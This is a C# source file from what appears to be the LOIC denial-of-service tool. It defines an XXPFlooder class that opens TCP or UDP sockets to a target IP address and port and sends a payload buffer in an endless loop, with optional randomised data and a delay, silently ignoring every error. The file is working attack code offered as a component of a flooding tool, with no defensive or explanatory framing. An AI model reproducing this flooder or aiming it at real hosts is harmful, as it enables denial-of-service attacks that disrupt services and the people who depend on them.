﻿using System;
using System.Text;
using System.Net.Sockets;
using System.ComponentModel;

namespace LOIC
{
	public class XXPFlooder
	{
		public bool IsFlooding { get; set; }
		public int FloodCount { get; set; }
		public string IP { get; set; }
		public int Port { get; set; }
		public int Protocol { get; set; }
		public int Delay { get; set; }
		public bool Resp { get; set; }
		public string Data { get; set; }
		private readonly bool random;

		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.random = random;
		}
		public void Start()
		{
			IsFlooding = true;
			var bw = new BackgroundWorker();
			bw.DoWork += bw_DoWork;
			bw.RunWorkerAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
			    string bufferContents = RandomiseData();

                byte[] buf = Encoding.ASCII.GetBytes(bufferContents);
				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket;
					if (Protocol == 1)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.NoDelay = true;

						while (IsFlooding) //Connect
						{					
							try { socket.Connect(RHost); }
							catch { continue; }
							break;
						}
					
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding) //Flood
							{
								FloodCount++;
								socket.Send(buf);
								SleepDelay();
							}
						}
						catch { }
					}
					if (Protocol == 2)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding) //Flood
							{
								FloodCount++;
								socket.SendTo(buf, SocketFlags.None, RHost);
                                SleepDelay();
							}
						}
						catch { }
					}
				}
			}
			catch { }
		}

	    private string RandomiseData()
	    {
	        if (random)
	        {
	            return String.Format(Data, Functions.RandomString());
	        }

            return Data;
	    }

	    private void SleepDelay()
	    {
	        if (Delay >= 0)
	        {
	            System.Threading.Thread.Sleep(Delay+1);
	        }
	    }
	}
}
